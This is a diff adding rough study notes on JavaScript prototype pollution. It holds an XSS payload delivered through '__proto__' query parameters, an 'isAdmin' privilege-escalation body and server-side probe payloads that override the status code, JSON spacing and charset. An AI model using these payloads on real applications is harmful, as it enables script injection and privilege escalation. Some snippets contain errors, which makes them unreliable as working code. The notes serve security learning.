@@ -62,3 +62,127 @@ bypasses
 /?constconstructorructor.protoprototypetype.foo=bar
 '''
 ```
+## client side pollution via browser api fetch
+### a usual fetch funciton 
+```
+
+fetch('/my-products.json',{method:"GET"})
+    .then((response) => response.json())
+    .then((data) => {
+        let username = data['x-username'];
+        let message = document.querySelector('.message');
+        if(username) {
+            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
+        }
+        let productList = document.querySelector('ul.products');
+        for(let product of data) {
+            let product = document.createElement('li');
+            product.append(product.name);
+            productList.append(product);
+        }
+    })
+    .catch(console.error)
+
+```
+### typical attack
+```
+?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
+```
+## pollution
+### setting property
+```
+Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
+    get() {
+        console.trace();
+        return 'polluted';
+    }
+})
+```
+### mitigation
+```
+Object.defineProperty(vulnerableObject, 'gadgetProperty', {
+    configurable: false,
+    writable: false
+}
+```
+## server side prototype pollution
+### example of object getting the inherited properties
+```
+const myArray = ['a','b'];
+Object.prototype.foo = 'bar';
+
+for(const arrayKey in myArray){
+    console.log(arrayKey);
+}
+
+// Output: 0, 1, foo
+another example of sending properties along with json
+"__proto__": {
+    "isAdmin":true
+}
+```
+### ways of chekcing serverside pollution
+```
+ Status code override(400-599
+
+JSON spaces override
+Charset override
+```
+### status code override
+```
+generic http error response(sometimes response status is set to 200 and error status is set inside the respone
+HTTP/1.1 200 OK
+...
+{
+    "error": {
+        "success": false,
+        "status": 401,
+        "message": "You do not have permission to access this resource."
+    }
+}
+...
+
+Node's http-errors module contains the following function for generating this kind of error response:
+
+function createError () {
+    //...
+    if (type === 'object' && arg instanceof Error) {
+        err = arg
+        status = err.status || err.statusCode || status
+    } else if (type === 'number' && i === 0) {
+    //...
+    if (typeof status !== 'number' ||
+    (!statuses.message[status] && (status > 400 || status >= 600))) {
+        status = 500
+    }
+    //...
+```
+#### exploit by status code
+```
+"__proto__": {
+    "status":555
+}
+```
+### JSON spaces override
+```
+The Express framework provides a json spaces option, which enables you to configure the number of spaces used to indent any JSON data in the response. developers mostly leve this to default
+->>was fixed in Express 4.17.4
+
+"__proto__": {
+    "json spaces":10
+}
+
+"constructor": {
+    "prototype": {
+        "json spaces":10
+    }
+}
+
+```
+### charset override
+```
+utf -7::"role":"+AGYAbwBv-"
+ "__proto__":{
+        "content-type": "application/json; charset=utf-7"
+    }
+```
